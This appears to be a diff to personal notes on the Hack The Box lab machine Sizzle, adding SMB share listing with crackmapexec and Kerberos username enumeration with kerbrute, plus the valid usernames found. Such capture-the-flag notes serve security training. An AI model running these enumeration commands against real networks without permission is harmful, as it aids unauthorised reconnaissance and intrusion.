@@ -42,3 +42,41 @@ smbclient -L 10.10.10.103 -U 'anonymous'
 ```
 ![[Pasted image 20240407160216.png]]
 
+```
+cme smb 10.10.10.103 -u 'anonymous' -p 'anonymous' --shares
+```
+domain:HTB.LOCAL
+sizzle.htb.local
+
+```
+kerbrute userenum -d HTB.local --dc 10.10.10.103 userlist.txt -t  100
+```
+
+```
+2024/04/07 06:48:37 >  [+] VALID USERNAME:       amanda@HTB.local
+2024/04/07 06:48:38 >  [+] VALID USERNAME:       guest@HTB.local
+2024/04/07 06:48:40 >  [+] VALID USERNAME:       administrator@HTB.local
+2024/04/07 06:48:45 >  [+] VALID USERNAME:       Amanda@HTB.local
+2024/04/07 06:48:58 >  [+] VALID USERNAME:       sizzle@HTB.local
+2024/04/07 06:49:02 >  [+] VALID USERNAME:       Guest@HTB.local
+2024/04/07 06:49:02 >  [+] VALID USERNAME:       Administrator@HTB.local
+2024/04/07 06:49:15 >  [+] VALID USERNAME:       AMANDA@HTB.local
+2024/04/07 06:49:21 >  [+] VALID USERNAME:       sizzler@HTB.local
+2024/04/07 06:50:29 >  [+] VALID USERNAME:       GUEST@HTB.local
+```
+![[Pasted image 20240407162414.png]]
+
+Valid Users
+```
+amanda@HTB.local
+guest@HTB.local
+administrator@HTB.local
+Amanda@HTB.local
+sizzle@HTB.local
+Guest@HTB.local
+Administrator@HTB.local
+AMANDA@HTB.local
+sizzler@HTB.local
+GUEST@HTB.local
+```
+
